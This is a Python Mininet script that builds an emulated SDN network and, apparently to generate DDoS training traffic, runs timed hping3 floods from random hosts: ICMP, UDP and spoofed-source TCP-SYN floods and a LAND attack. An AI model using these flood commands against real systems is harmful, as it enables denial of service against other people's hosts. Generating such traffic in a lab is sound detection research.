from mininet.topo import Topo
from mininet.net import Mininet
from mininet.link import TCLink
from mininet.log import setLogLevel
from mininet.node import OVSKernelSwitch, RemoteController
from time import sleep
from datetime import datetime
from random import randrange, choice

class MyTopo(Topo):
    def build(self):
        switches = []
        hosts = []

        for s in range(1, 6):
            switch_name = 's{}'.format(s)
            switch = self.addSwitch(switch_name, cls=OVSKernelSwitch, protocols='OpenFlow13')
            switches.append(switch)

            for h in range(1, 4):
                host_name = 'h{}'.format(s * 3 + h - 3)
                host_ip = '10.0.0.{}/24'.format(s * 3 + h - 3)
                host = self.addHost(host_name, cpu=1.0/20, mac="00:00:00:00:00:{:02d}".format(s * 3 + h - 3), ip=host_ip)
                hosts.append(host)
                self.addLink(host, switch)

        for i in range(len(switches) - 1):
            self.addLink(switches[i], switches[i + 1])

def ip_generator():
    ip = ".".join(["10", "0", "0", str(randrange(1, 15))])
    return ip

def startNetwork():
    topo = MyTopo()
    c0 = RemoteController('c0', ip='127.0.0.1')
    net = Mininet(topo=topo, link=TCLink, controller=c0)
    net.start()

    h1 = net.get('h1')
    hosts = [h1] + [net.get(f'h{i}') for i in range(2, 15)]

    h1.cmd('cd /home/mininet/webserver')
    h1.cmd('python -m SimpleHTTPServer 80 &')
    
    src = choice(hosts)
    dst = ip_generator()   
    print("--------------------------------------------------------------------------------")
    print("Performing ICMP (Ping) Flood")  
    print("--------------------------------------------------------------------------------")   
    src.cmd("timeout 20s hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood {}".format(dst))  
    sleep(100)
        
    src = choice(hosts)
    dst = ip_generator()   
    print("--------------------------------------------------------------------------------")
    print("Performing UDP Flood")  
    print("--------------------------------------------------------------------------------")   
    src.cmd("timeout 20s hping3 -2 -V -d 120 -w 64 --rand-source --flood {}".format(dst))    
    sleep(100)
    
    src = choice(hosts)
    dst = ip_generator()    
    print("--------------------------------------------------------------------------------")
    print("Performing TCP-SYN Flood")  
    print("--------------------------------------------------------------------------------")
    src.cmd('timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.1')
    sleep(100)
    
    src = choice(hosts)
    dst = ip_generator()   
    print("--------------------------------------------------------------------------------")
    print("Performing LAND Attack")  
    print("--------------------------------------------------------------------------------")   
    src.cmd("timeout 20s hping3 -1 -V -d 120 -w 64 --flood -a {} {}".format(dst,dst))
    sleep(100)  
    print("--------------------------------------------------------------------------------")

    # CLI(net)
    net.stop()

if __name__ == '__main__':
    start = datetime.now()

    setLogLevel('info')
    startNetwork()

    end = datetime.now()

    print(end - start)